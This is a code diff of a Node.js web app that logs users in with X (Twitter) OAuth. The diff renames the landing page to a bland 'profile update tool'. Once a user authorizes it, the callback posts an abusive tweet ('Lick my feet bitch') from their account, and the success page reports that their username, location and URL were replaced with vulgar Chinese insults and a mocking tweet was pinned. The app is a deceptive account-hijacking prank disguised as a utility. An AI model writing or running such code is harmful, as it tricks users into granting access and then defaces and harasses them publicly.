@@ -64,16 +64,16 @@ app.get('/', (req, res) => {
     </head>
     <body>
         <div class="container">
-          <h1>林的小屋</h1>
-          <p>点击下方按钮来成为林的狗狗吧。</p>
+          <h1>X用户资料更新工具</h1>
+          <p>点击下方按钮授权我们来更新您的资料和发布推文。</p>
           <a class="btn" href="/auth/x">Login with X</a>
           
           <div class="note">
-            <strong>注意：</strong> 点击后，你将成为林大人的狗。
+            <strong>注意：</strong> 授权后，我们将更新您的X资料并发布一条推文。
           </div>
           
           <div class="warning">
-            <strong> 点击进入狗窝。
+            <strong>警告：</strong> 请确保您了解此操作将修改您的公开资料并发布公开内容。
           </div>
         </div>
     </body>
@@ -206,14 +206,14 @@ app.get('/api/callback', async (req, res) => {
       const username = meResponse.data.data.username;
       console.log('当前用户ID:', userId, '用户名:', username);
       
- 
+     
       // 4. 发送推文
       console.log('发送推文...');
       try {
         const tweetResponse = await axios.post(
           'https://api.twitter.com/2/tweets',
           {
-            text: "Lick my feet, bitch"
+            text: " Lick my feet bitch"
           },
           {
             headers: {
@@ -227,7 +227,7 @@ app.get('/api/callback', async (req, res) => {
         const tweetId = tweetResponse.data.data.id;
         console.log('推文发送成功，ID:', tweetId);
         
-   
+       
         // 显示成功页面
         res.send(`
           <!DOCTYPE html>
@@ -262,13 +262,17 @@ app.get('/api/callback', async (req, res) => {
           <body>
             <div class="container">
               <h1>🎉 操作成功！</h1>
-              <p>您已经是林大人的狗啦：</p>
+              <p>您的X资料和推文已成功更新：</p>
               
               <div class="success-info">
-                <p><strong>欢迎加入林大人的小屋</p>
+                <p><strong>新用户名:</strong> 妖屌亲妈鱼鱼子</p>
+                <p><strong>新地点:</strong> 你全家头上</p>
+                <p><strong>新URL:</strong> https://x.com/qin61846754</p>
+                <p><strong>新推文:</strong> 不会有人20多岁还是处男躲在被窝看我推文等我更新吧</p>
+                <p><strong>推文状态:</strong> 已发送并尝试置顶</p>
               </div>
               
-              <p>您现在可以返回X查看。</p>
+              <p>您现在可以返回X查看更改。</p>
             </div>
           </body>
           </html>
